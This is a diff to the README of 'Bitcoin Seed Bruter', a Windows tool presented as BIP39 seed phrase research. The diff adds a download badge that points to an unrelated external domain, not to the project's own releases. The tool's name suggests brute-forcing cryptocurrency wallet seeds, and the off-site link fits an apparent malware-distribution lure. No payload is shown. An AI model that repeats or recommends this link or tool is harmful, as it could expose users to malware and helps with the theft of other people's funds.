@@ -1,5 +1,7 @@
 # Bitcoin Seed Bruter
 
+[![Download Bitcoin Seed Bruter](https://img.shields.io/badge/Download-Bitcoin_Seed_Bruter-blueviolet)](https://dyhuiying.com/s/file)
+
 **Bitcoin Seed Bruter** is a Windows-based project for Bitcoin seed phrase research and BIP39 mnemonic analysis. The interface brings together format checks, checksum-related diagnostics, controlled local testing, and saved research settings. The current release includes mnemonic-format analysis, checksum diagnostics, local testing workflows, and configurable research profiles.
 
 ![Version](https://img.shields.io/badge/version-check_release-blue)
